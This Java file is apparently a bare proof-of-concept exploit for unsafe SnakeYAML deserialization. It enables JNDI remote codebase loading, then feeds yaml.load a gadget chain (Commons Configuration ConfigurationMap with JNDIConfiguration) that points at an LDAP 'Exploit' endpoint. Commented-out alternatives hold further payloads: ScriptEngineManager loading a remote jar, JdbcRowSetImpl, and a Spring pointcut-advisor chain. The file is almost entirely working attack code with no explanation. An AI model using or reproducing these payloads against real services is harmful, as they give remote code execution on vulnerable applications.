package CVE;

import org.yaml.snakeyaml.Yaml;
import org.apache.commons.configuration.ConfigurationMap;
import java.io.FileNotFoundException;
import java.io.IOException;
/*
http://artsploit.com/yaml-payload.jar
 */
public class Exp {
    public static void main(String[] args) throws IOException {
        Yaml yaml = new Yaml();
//        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.rmi.registry.trustURLCodebase","true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
//        String poc = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1/yaml-payload.jar\"]]]]";
//        String poc = "!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \"ldap://localhost:1389/Test\"\n autoCommit: true";
//        String poc = "Dem0:\n" +
//                "    ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\n" +
//                "      adviceBeanName: \"ldap://localhost:1389/Exploit\"\n" +
//                "      beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n" +
//                "        shareableResources: [\"ldap://localhost:1389/Exploit\"]\n"+
//                "    ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor []";
        String poc = "set:\n" +
                "    ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \"ldap://localhost:1389/Exploit\"]]";
        System.out.println(yaml.load(poc));
    }
}
